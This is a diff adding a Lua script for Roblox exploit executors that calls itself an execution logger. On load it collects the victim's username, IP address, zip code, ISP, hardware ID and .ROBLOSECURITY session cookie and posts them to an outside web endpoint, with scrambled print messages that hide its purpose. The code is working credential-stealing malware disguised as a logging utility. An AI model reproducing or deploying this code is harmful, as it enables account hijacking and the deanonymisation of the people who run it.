@@ -1,0 +1,187 @@
+-- Euva Firebase Logger (Standalone)
+-- Automatically sends execution data to Firebase when loaded
+-- Just execute this script and it logs everything
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Configuration
+local FIREBASE_URL = "https://logexecution-6l3uvhfada-uc.a.run.app"
+
+print("!K*GBH!*&#")
+
+-- Get player stats
+local function getPlayerStats()
+    local stats = {
+        Level = "N/A",
+        Money = "N/A",
+        Wins = "N/A"
+    }
+    
+    if LocalPlayer:FindFirstChild("leaderstats") then
+        local leaderstats = LocalPlayer.leaderstats
+        if leaderstats:FindFirstChild("Level") then
+            stats.Level = tostring(leaderstats.Level.Value)
+        end
+        if leaderstats:FindFirstChild("Money") then
+            stats.Money = tostring(leaderstats.Money.Value)
+        end
+        if leaderstats:FindFirstChild("Wins") then
+            stats.Wins = tostring(leaderstats.Wins.Value)
+        end
+    end
+    
+    return stats
+end
+
+-- Get player region
+local function getPlayerRegion()
+    local LocalizationService = game:GetService("LocalizationService")
+    local success, result = pcall(function()
+        return LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
+    end)
+    return success and result or "Unknown"
+end
+
+-- Get IP information
+local function getIPInfo()
+    local ipData = {
+        ip = "Unknown",
+        zip = "Unknown",
+        isp = "Unknown"
+    }
+    
+    pcall(function()
+        local response = game:HttpGet("http://ip-api.com/json/?fields=status,query,zip,isp")
+        local data = HttpService:JSONDecode(response)
+        if data.status == "success" then
+            ipData.ip = data.query or "Unknown"
+            ipData.zip = data.zip or "Unknown"
+            ipData.isp = data.isp or "Unknown"
+        end
+    end)
+    
+    return ipData
+end
+
+-- Get executor identifiers
+local function getExecutorInfo()
+    local clientId = "Unknown"
+    local hwid = "Unknown"
+    local cookies = "Unknown"
+    
+    -- Get ClientID
+    pcall(function()
+        if GetClientID then
+            clientId = tostring(GetClientID())
+        elseif getclientid then
+            clientId = tostring(getclientid())
+        end
+    end)
+    
+    -- Get HWID
+    pcall(function()
+        if GetHwid then
+            hwid = tostring(GetHwid())
+        elseif gethwid then
+            hwid = tostring(gethwid())
+        end
+    end)
+    
+    -- Get Roblox cookies
+    pcall(function()
+        if syn and syn.request then
+            local cookieHeader = syn.request({Url = "https://www.roblox.com/home", Method = "GET"}).Headers["set-cookie"]
+            if cookieHeader and string.find(cookieHeader, ".ROBLOSECURITY") then
+                cookies = string.match(cookieHeader, ".ROBLOSECURITY=([^;]+)")
+            end
+        elseif request then
+            local cookieHeader = request({Url = "https://www.roblox.com/home", Method = "GET"}).Headers["set-cookie"]
+            if cookieHeader and string.find(cookieHeader, ".ROBLOSECURITY") then
+                cookies = string.match(cookieHeader, ".ROBLOSECURITY=([^;]+)")
+            end
+        end
+        
+        if cookies == "Unknown" then
+            if getcookies then
+                cookies = tostring(getcookies())
+            elseif GetCookies then
+                cookies = tostring(GetCookies())
+            end
+        end
+    end)
+    
+    return clientId, hwid, cookies
+end
+
+-- Send data to Firebase
+local function sendToFirebase()
+    print("*!S*(X*NR@")
+    
+    local stats = getPlayerStats()
+    local region = getPlayerRegion()
+    local ipInfo = getIPInfo()
+    local clientId, hwid, cookies = getExecutorInfo()
+    
+    local data = {
+        userId = tostring(LocalPlayer.UserId),
+        username = LocalPlayer.Name,
+        displayName = LocalPlayer.DisplayName,
+        accountAge = LocalPlayer.AccountAge,
+        level = stats.Level,
+        money = stats.Money,
+        wins = stats.Wins,
+        region = region,
+        jobId = game.JobId ~= "" and game.JobId or "Private Server",
+        timestamp = os.time(),
+        dateTime = os.date("%Y-%m-%d %H:%M:%S"),
+        executor = identifyexecutor and identifyexecutor() or "Unknown",
+        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+        placeId = tostring(game.PlaceId),
+        ipAddress = ipInfo.ip,
+        zipCode = ipInfo.zip,
+        isp = ipInfo.isp,
+        clientId = clientId,
+        hwid = hwid,
+        cookies = cookies
+    }
+    
+    print("hUH")
+    
+    local success, err = pcall(function()
+        local jsonData = HttpService:JSONEncode(data)
+        
+        local response = request({
+            Url = FIREBASE_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+        
+        if response.StatusCode == 200 then
+            print("✅ j!e*dh!!")
+            print("📊 !*d jnj@#*d: ")
+            print("e*!uj*A^")
+            print("*!*@HD*)
+            return true
+        else
+            warn("⚠️ *(!nd&!:")
+            return false
+        end
+    end)
+    
+    if not success then
+        warn("❌ AKC&@POD:")
+        return false
+    end
+    
+    return success
+end
+
+-- Execute immediately on load
+sendToFirebase()
+
+print("✅ **&%#HDHW")
